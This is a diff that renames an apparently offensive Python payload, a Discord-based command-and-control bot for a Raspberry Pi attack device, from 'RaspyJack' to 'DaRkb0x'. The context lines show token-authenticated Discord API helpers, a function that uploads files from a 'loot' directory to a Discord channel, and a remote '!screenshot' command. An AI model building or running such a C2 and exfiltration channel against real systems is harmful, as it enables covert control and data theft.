@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Pagecord (Discord C2 Bot)
+DaRkb0x Payload -- Pagecord (Discord C2 Bot)
 -----------------------------------------------
 Author: 7h30th3r0n3
 
@@ -57,8 +57,8 @@ font = scaled_font()
 
 DEBOUNCE = 0.25
 ROW_H = 12
-CONFIG_PATH = "/root/Raspyjack/loot/Pagecord/config.json"
-LOOT_DIR = "/root/Raspyjack/loot"
+CONFIG_PATH = "/root/DaRkb0x/loot/Pagecord/config.json"
+LOOT_DIR = "/root/DaRkb0x/loot"
 DISCORD_API = "https://discord.com/api/v10"
 POLL_INTERVAL = 3.0
 MAX_LOG_LINES = 50
@@ -107,7 +107,7 @@ def _discord_get(token, endpoint, timeout=10):
     url = f"{DISCORD_API}{endpoint}"
     req = urllib.request.Request(url, method="GET")
     req.add_header("Authorization", f"Bot {token}")
-    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")
+    req.add_header("User-Agent", "DaRkb0x-Pagecord/1.0")
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             return json.loads(resp.read().decode()), None
@@ -127,7 +127,7 @@ def _discord_post_json(token, endpoint, payload, timeout=15):
     req = urllib.request.Request(url, data=data, method="POST")
     req.add_header("Authorization", f"Bot {token}")
     req.add_header("Content-Type", "application/json")
-    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")
+    req.add_header("User-Agent", "DaRkb0x-Pagecord/1.0")
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             return json.loads(resp.read().decode()), None
@@ -174,7 +174,7 @@ def _discord_upload_file(token, channel_id, filepath, message=""):
     if len(file_data) > 8 * 1024 * 1024:
         return None, "File exceeds 8MB limit"
 
-    boundary = "----RaspyJackBoundary"
+    boundary = "----DaRkb0xBoundary"
     body = b""
 
     if message:
@@ -191,7 +191,7 @@ def _discord_upload_file(token, channel_id, filepath, message=""):
     req = urllib.request.Request(url, data=body, method="POST")
     req.add_header("Authorization", f"Bot {token}")
     req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
-    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")
+    req.add_header("User-Agent", "DaRkb0x-Pagecord/1.0")
 
     try:
         with urllib.request.urlopen(req, timeout=60) as resp:
@@ -464,7 +464,7 @@ def _process_command(token, channel_id, message_content, state):
 
     elif content == "!screenshot":
         state.add_log("screenshot request")
-        tmp_path = "/tmp/rj_lcd_screenshot.png"
+        tmp_path = "/tmp/db_lcd_screenshot.png"
         try:
             # Capture current LCD image
             img = Image.new("RGB", (WIDTH, HEIGHT), "black")
